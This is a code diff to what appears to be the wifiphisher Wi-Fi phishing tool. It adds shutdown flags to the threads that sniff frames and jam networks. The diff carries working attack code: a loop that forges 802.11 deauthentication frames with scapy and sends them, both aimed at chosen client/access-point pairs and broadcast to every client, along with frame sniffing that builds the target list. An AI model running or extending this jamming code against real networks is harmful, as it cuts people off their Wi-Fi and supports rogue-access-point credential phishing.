@@ -26,6 +26,8 @@ count = 0  # for channel hopping Thread
 APs = {} # for listing APs
 clients_APs = []
 hop_daemon_running = True
+sniff_daemon_running = True
+jamming_daemon_running = True
 terminate = False
 lock = Lock()
 args = 0
@@ -128,10 +130,19 @@ def check_args(args):
     or len(args.presharedkey) > 64):
         sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
 
+def stopfilter(x):
+    if not sniff_daemon_running:
+        return True
+    return False
+
 def shutdown(wireless_interfaces=None):
     """
     Shutdowns program.
     """
+    global jamming_daemon_running, sniff_daemon_running
+    jamming_daemon_running = False
+    sniff_daemon_running = False
+
     os.system('iptables -F')
     os.system('iptables -X')
     os.system('iptables -t nat -F')
@@ -139,6 +150,7 @@ def shutdown(wireless_interfaces=None):
     os.system('pkill airbase-ng')
     os.system('pkill dnsmasq')
     os.system('pkill hostapd')
+
     if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
         os.remove('/tmp/wifiphisher-webserver.tmp')
     if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
@@ -193,7 +205,14 @@ def channel_hop(mon_iface):
 def sniffing(interface, cb):
     '''This exists for if/when I get deauth working
     so that it's easy to call sniff() in a thread'''
-    sniff(iface=interface, prn=cb, store=0)
+    try:
+        sniff(iface=interface, prn=cb, store=0, stop_filter=stopfilter)
+    except socket.error as e:
+        # Network is down
+        if e.errno == 100:
+            pass
+        else:
+            raise
 
 
 def targeting_cb(pkt):
@@ -473,55 +492,56 @@ def deauth(monchannel):
     and starts a thread to deauth each instance
     '''
 
-    global clients_APs, APs, args
+    global clients_APs, APs, args, jamming_daemon_running
 
     pkts = []
 
-    if len(clients_APs) > 0:
-        with lock:
-            for x in clients_APs:
-                client = x[0]
-                ap = x[1]
-                ch = x[2]
-                '''
-                Can't add a RadioTap() layer as the first layer or it's a
-                malformed Association request packet?
-                Append the packets to a new list so we don't have to hog the
-                lock type=0, subtype=12?
-                '''
-                if ch == monchannel:
-                    deauth_pkt1 = Dot11(
-                        addr1=client,
-                        addr2=ap,
-                        addr3=ap) / Dot11Deauth()
-                    deauth_pkt2 = Dot11(
-                        addr1=ap,
-                        addr2=client,
-                        addr3=client) / Dot11Deauth()
-                    pkts.append(deauth_pkt1)
-                    pkts.append(deauth_pkt2)
-    if len(APs) > 0:
-        if not args.directedonly:
+    while jamming_daemon_running:
+        if len(clients_APs) > 0:
             with lock:
-                for a in APs:
-                    ap = a[0]
-                    ch = a[1]
+                for x in clients_APs:
+                    client = x[0]
+                    ap = x[1]
+                    ch = x[2]
+                    '''
+                    Can't add a RadioTap() layer as the first layer or it's a
+                    malformed Association request packet?
+                    Append the packets to a new list so we don't have to hog the
+                    lock type=0, subtype=12?
+                    '''
                     if ch == monchannel:
-                        deauth_ap = Dot11(
-                            addr1='ff:ff:ff:ff:ff:ff',
+                        deauth_pkt1 = Dot11(
+                            addr1=client,
                             addr2=ap,
                             addr3=ap) / Dot11Deauth()
-                        pkts.append(deauth_ap)
+                        deauth_pkt2 = Dot11(
+                            addr1=ap,
+                            addr2=client,
+                            addr3=client) / Dot11Deauth()
+                        pkts.append(deauth_pkt1)
+                        pkts.append(deauth_pkt2)
+        if len(APs) > 0:
+            if not args.directedonly:
+                with lock:
+                    for a in APs:
+                        ap = a[0]
+                        ch = a[1]
+                        if ch == monchannel:
+                            deauth_ap = Dot11(
+                                addr1='ff:ff:ff:ff:ff:ff',
+                                addr2=ap,
+                                addr3=ap) / Dot11Deauth()
+                            pkts.append(deauth_ap)
 
-    if len(pkts) > 0:
-        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
-        if not args.timeinterval:
-            args.timeinterval = 0
-        if not args.packets:
-            args.packets = 1
+        if len(pkts) > 0:
+            # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
+            if not args.timeinterval:
+                args.timeinterval = 0
+            if not args.packets:
+                args.packets = 1
 
-        for p in pkts:
-            send(p, inter=float(args.timeinterval), count=int(args.packets))
+            for p in pkts:
+                send(p, inter=float(args.timeinterval), count=int(args.packets))
 
 
 def output(monchannel):
@@ -575,45 +595,46 @@ def cb(pkt):
     are type 1 or 2 (control, data), and append the addr1 and addr2
     to the list of deauth targets.
     '''
-    global clients_APs, APs, args
+    global clients_APs, APs, args, sniff_daemon_running
 
-    # return these if's keeping clients_APs the same or just reset clients_APs?
-    # I like the idea of the tool repopulating the variable more
-    if args.maximum:
-        if args.noupdate:
-            if len(clients_APs) > int(args.maximum):
-                return
-        else:
-            if len(clients_APs) > int(args.maximum):
-                with lock:
-                    clients_APs = []
-                    APs = []
+    if sniff_daemon_running:
+        # return these if's keeping clients_APs the same or just reset clients_APs?
+        # I like the idea of the tool repopulating the variable more
+        if args.maximum:
+            if args.noupdate:
+                if len(clients_APs) > int(args.maximum):
+                    return
+            else:
+                if len(clients_APs) > int(args.maximum):
+                    with lock:
+                        clients_APs = []
+                        APs = []
 
-    '''
-    We're adding the AP and channel to the deauth list at time of creation
-    rather than updating on the fly in order to avoid costly for loops
-    that require a lock.
-    '''
+        '''
+        We're adding the AP and channel to the deauth list at time of creation
+        rather than updating on the fly in order to avoid costly for loops
+        that require a lock.
+        '''
 
-    if pkt.haslayer(Dot11):
-        if pkt.addr1 and pkt.addr2:
+        if pkt.haslayer(Dot11):
+            if pkt.addr1 and pkt.addr2:
 
-            # Filter out all other APs and clients if asked
-            if args.accesspoint:
-                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                # Filter out all other APs and clients if asked
+                if args.accesspoint:
+                    if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                        return
+
+                # Check if it's added to our AP list
+                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+                    APs_add(clients_APs, APs, pkt, args.channel)
+
+                # Ignore all the noisy packets like spanning tree
+                if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                     return
 
-            # Check if it's added to our AP list
-            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-                APs_add(clients_APs, APs, pkt, args.channel)
-
-            # Ignore all the noisy packets like spanning tree
-            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
-                return
-
-            # Management = 1, data = 2
-            if pkt.type in [1, 2]:
-                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
+                # Management = 1, data = 2
+                if pkt.type in [1, 2]:
+                    clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
 
 
 def APs_add(clients_APs, APs, pkt, chan_arg):
@@ -690,7 +711,14 @@ def sniff_dot11(mon_iface):
     """
     We need this here to run it from a thread.
     """
-    sniff(iface=mon_iface, store=0, prn=cb)
+    try:
+        sniff(iface=mon_iface, store=0, prn=cb, stop_filter=stopfilter)
+    except socket.error as e:
+        # Network is down
+        if e.errno == 100:
+            pass
+        else:
+            raise
 
 def get_dnsmasq():
     if not os.path.isfile('/usr/sbin/dnsmasq'):
@@ -804,7 +832,7 @@ def run():
     used_interfaces = list()
 
     # Parse args
-    global args, APs, clients_APs, mon_MAC, mac_matcher
+    global args, APs, clients_APs, mon_MAC, mac_matcher, hop_daemon_running
     args = parse_args()
 
     # Check args
@@ -853,6 +881,7 @@ def run():
             interfaces.NoApInterfaceFoundError,
             interfaces.NoMonitorInterfaceFoundError) as err:
         print ("[{0}!{1}] " + str(err)).format(R, W)
+        time.sleep(2)
         shutdown()
 
     # add the selected interfaces to the used list
@@ -989,7 +1018,7 @@ def run():
 
     time.sleep(3)
 
-    #no longer need mac_matcher
+    # We no longer need mac_matcher
     mac_matcher.unbind()
 
     clients_APs = []
@@ -1038,7 +1067,6 @@ def run():
                 lines = "\n" * LINES_OUTPUT
             print lines
             if phishinghttp.terminate:
-                time.sleep(3)
                 shutdown(used_interfaces)
             time.sleep(0.5)
     except KeyboardInterrupt:
